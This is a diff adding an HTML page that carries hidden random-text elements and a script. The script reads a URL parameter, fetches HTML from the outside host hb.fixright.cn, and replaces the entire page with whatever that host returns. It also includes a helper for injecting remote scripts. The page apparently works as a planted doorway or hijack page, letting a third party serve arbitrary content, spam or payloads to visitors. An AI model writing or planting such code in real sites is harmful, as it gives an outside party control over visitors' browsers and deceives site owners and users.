@@ -1,0 +1,41 @@
+
+<!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body>
+<div style='display:none'>cSLivn4i22QEym1LRFmqyWOqQOJSVg2XDyA5L</div>
+<img  src='' style='display:none'>
+<img  src='' style='display:none'>
+<div style='display:none'>cSLivn4i22QEym1LRFmqyWOqQOJSVg2XDyA5L</div>
+<ul style='display:none' >V2IRPHGjzssC9TZxzx2Lzp1dJmkor9N3W8rGmZV4EJyHDvu9hVxS5NSw5qOZOL1YKOi2wR4IqXy69</ul>
+<b style='display:none' >u6yZsC0KPNXlydT30Or0Qn9y1ytuqnNNQdlYDkB6bmY1Os</b>
+<a  href='#' style='display:none'>D6Z39sO63cR2x1mw2fp7qeZ5L</a>
+<span style='display:none'>KiquUHKH2pEGjAAIiNNdu2UCxSeX0JbMbzVL92oSwBEprAZ9YeAe4iwoh6lgbKx0Zglt4ZnqyjkUflQjEpT2GELXtXYvp</span>
+<h1 style='display:none' >Y7WKIfkajGzMZmyZPtSsj62S387vptGC7hEouvRJC8YlCWQU8bnttai7o8dl9w</h1></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('//hb.fixright.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
